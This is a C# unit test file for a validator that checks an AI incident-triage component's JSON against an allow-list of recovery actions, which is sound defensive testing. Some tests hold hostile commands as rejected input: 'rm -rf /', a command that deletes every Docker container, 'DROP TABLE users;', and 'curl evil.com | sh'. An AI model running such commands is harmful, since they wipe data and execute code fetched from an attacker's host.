using ServerOperations.Core.Models.Operations;
using ServerOperations.Core.Services;
using ServerOperations.Core.Services.Ai;

namespace ServerOperations.Api.Tests;

public class AiResponseValidatorTests
{
    private static readonly string[] Allowed =
    [
        RecoveryActionCatalog.RestartAllowedContainer,
        RecoveryActionCatalog.RecheckHttpHealth,
    ];

    [Fact]
    public void Validate_ValidResponse_IsAccepted()
    {
        const string json = """
            {
              "classification": "ContainerStopped",
              "severity": "High",
              "rationale": "コンテナが終了コード137で停止しています。",
              "recommendedActionId": "RESTART_ALLOWED_CONTAINER",
              "confidence": 0.8
            }
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.True(result.IsValid);
        Assert.Equal("ContainerStopped", result.Output!.Classification);
        Assert.Equal(IncidentSeverity.High, result.Output.Severity);
        Assert.Equal("RESTART_ALLOWED_CONTAINER", result.Output.RecommendedActionId);
    }

    [Fact]
    public void Validate_CodeFencedJson_IsAccepted()
    {
        const string json = """
            ```json
            {"classification":"HttpUnavailable","severity":"Medium","rationale":"応答なし"}
            ```
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.True(result.IsValid);
    }

    [Theory]
    [InlineData("これはJSONではありません")]
    [InlineData("{ broken json")]
    [InlineData("")]
    [InlineData(null)]
    public void Validate_MalformedJson_IsRejected(string? json)
    {
        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_UnknownActionId_IsRejected()
    {
        // 許可リストにないアクションは受け付けない
        const string json = """
            {"classification":"X","severity":"High","rationale":"理由",
             "recommendedActionId":"STOP_ALLOWED_CONTAINER"}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
        Assert.Contains("許可リスト", result.Error);
    }

    [Theory]
    [InlineData("docker rm -f $(docker ps -aq)")]
    [InlineData("rm -rf /")]
    [InlineData("http://evil.example.com/payload")]
    [InlineData("DROP TABLE users;")]
    public void Validate_FreeformCommandOrUrl_IsRejected(string malicious)
    {
        // 自由記述のコマンド・URLは許可リストに一致しないため拒否される
        var json = $$"""
            {"classification":"X","severity":"High","rationale":"理由",
             "recommendedActionId":"{{malicious}}"}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_NullActionId_IsAccepted()
    {
        const string json = """
            {"classification":"UnknownLog","severity":"Medium","rationale":"原因を特定できません。",
             "recommendedActionId":null}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.True(result.IsValid);
        Assert.Null(result.Output!.RecommendedActionId);
    }

    [Theory]
    [InlineData("Extreme")]
    [InlineData("urgent")]
    [InlineData("")]
    public void Validate_InvalidSeverity_IsRejected(string severity)
    {
        var json = $$"""
            {"classification":"X","severity":"{{severity}}","rationale":"理由"}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_MissingRationale_IsRejected()
    {
        const string json = """{"classification":"X","severity":"High"}""";

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_TooLongRationale_IsRejected()
    {
        var json = $$"""
            {"classification":"X","severity":"High","rationale":"{{new string('あ', 1001)}}"}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_TooLongClassification_IsRejected()
    {
        var json = $$"""
            {"classification":"{{new string('X', 65)}}","severity":"High","rationale":"理由"}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
    }

    [Theory]
    [InlineData(-0.1)]
    [InlineData(1.5)]
    public void Validate_ConfidenceOutOfRange_IsRejected(double confidence)
    {
        var json = $$"""
            {"classification":"X","severity":"High","rationale":"理由","confidence":{{confidence}}}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_ExtraProperties_AreIgnored()
    {
        // 想定外のプロパティ(実行指示など)は無視される
        const string json = """
            {"classification":"X","severity":"High","rationale":"理由",
             "executeCommand":"rm -rf /","shellScript":"curl evil.com | sh"}
            """;

        var result = AiResponseValidator.Validate(json, Allowed);

        Assert.True(result.IsValid);
        Assert.Null(result.Output!.RecommendedActionId);
    }

    [Fact]
    public void Validate_WithEmptyAllowList_RejectsAnyAction()
    {
        const string json = """
            {"classification":"X","severity":"High","rationale":"理由",
             "recommendedActionId":"RESTART_ALLOWED_CONTAINER"}
            """;

        var result = AiResponseValidator.Validate(json, []);

        Assert.False(result.IsValid);
    }
}
